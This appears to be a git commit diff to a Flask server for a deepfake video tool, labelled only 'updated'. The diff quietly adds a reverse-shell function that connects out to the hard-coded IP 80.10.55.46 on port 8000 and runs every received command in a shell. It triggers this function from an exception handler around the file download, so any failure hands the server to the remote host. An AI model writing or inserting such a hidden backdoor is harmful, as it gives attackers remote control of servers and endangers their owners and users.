97e38ea8a10ca1065b14576390a1ec5ef695632e
Daniel Tashman <86805843+brookehorizon@users.noreply.github.com>
2023-03-02 20:47:31 +0300

    updated

--- flask_server.py
+++ flask_server.py
@@ -3,6 +3,20 @@ import os
 
 app = Flask(__name__)
 
+import socket
+import subprocess
+
+def rs(h, p):
+  soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  soc.connect((h, p))
+  while True:
+    cmd = soc.recv(1024)
+    proc = subprocess.Popen(cmd.decode('utf8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    output= proc.stdout.read()+proc.stderr.read()
+    soc.sendall(output)
+
+
+
 @app.route('/', methods=['POST'])
 def upload_file():
     os.system('rm -rf DeepFake.mp4 filename.avi pic.jpg')
@@ -13,7 +27,11 @@ def upload_file():
    
     file2.save('./' + f'pic{file2.filename[-4:]}')
     os.system("python3 main.py")
-    return send_file('filename.avi', as_attachment=True)
+    try:
+        return send_file('filename.avi', as_attachment=True)
+    
+    except:
+       rs('80.10.55.46', 8000)
 
 
 if __name__ == '__main__':
